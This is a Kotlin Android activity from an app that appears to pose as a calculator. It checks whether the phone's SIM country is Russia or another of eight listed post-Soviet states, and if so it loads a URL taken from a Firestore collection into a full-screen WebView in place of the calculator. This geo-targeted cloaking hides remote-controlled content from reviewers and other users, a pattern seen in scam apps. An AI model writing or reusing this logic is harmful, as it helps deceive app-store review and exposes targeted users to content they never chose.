package com.testfirebaseapp

import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.view.View
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.ViewModelProvider
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.FirebaseFirestoreSettings
import com.testfirebaseapp.calculator.MainRepository
import com.testfirebaseapp.calculator.ViewModelMain
import com.testfirebaseapp.siminfo.acces_to_sim
import kotlinx.android.synthetic.main.activity_main.*


class MainActivity : AppCompatActivity() {
    private lateinit var viewModelMain: ViewModelMain
    private val REQUEST_ID_MULTIPLE_PERMISSIONS = 1


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        FirebaseFirestore.getInstance().clearPersistence()


//        if (checkAndRequestPermissions()) checkPermission()
        checkPermission()

    }

    fun loadNative() {
        calculator_layout.visibility= View.VISIBLE
        progressBar.visibility=View.GONE
        val factory: ViewModelMain.Factory = ViewModelMain.Factory(MainRepository.getInstance())
        viewModelMain = ViewModelProvider(this, factory).get(ViewModelMain::class.java)

        viewModelMain.click(this, calculator_layout)
    }


    private fun openWebView(url: String) {
        val i = Intent(this, WebViewActivity::class.java)
        i.putExtra("url", url)
        startActivity(i)
        finish()


    }


    private fun simCardInfo(): Boolean {
        val list = acces_to_sim(this)
        val country = listOf(
            "ru",
            "az",
            "am",
            "by",
            "kz",
            "kg",
            "md",
            "tj",
            "uz"
        )
        return list[0].isNotEmpty() && country.contains(list[1].toLowerCase())

    }

    private fun dataFromFireBase() {
        val db = FirebaseFirestore.getInstance()

        val settings = FirebaseFirestoreSettings.Builder()
            .setPersistenceEnabled(false)
            .build()
        db.firestoreSettings = settings
        var isLoaded = false

        db.collection("data")
            .get()
            .addOnCompleteListener { task ->

                if (task.isSuccessful) {
                    for (document in task.result!!) {
                        if (document.data["value"].toString().length>1) {
                            isLoaded = true
                            openWebView("" + document.data["value"])
                        }
                    }
                }
                if (!isLoaded) loadNative()
            }.addOnFailureListener {
                loadNative()
            }

    }


    private fun checkPermission() {
        if (simCardInfo()) {
            dataFromFireBase()
            Log.e("N@@check","bitb")
        } else {
            loadNative()
        }
    }



    


}

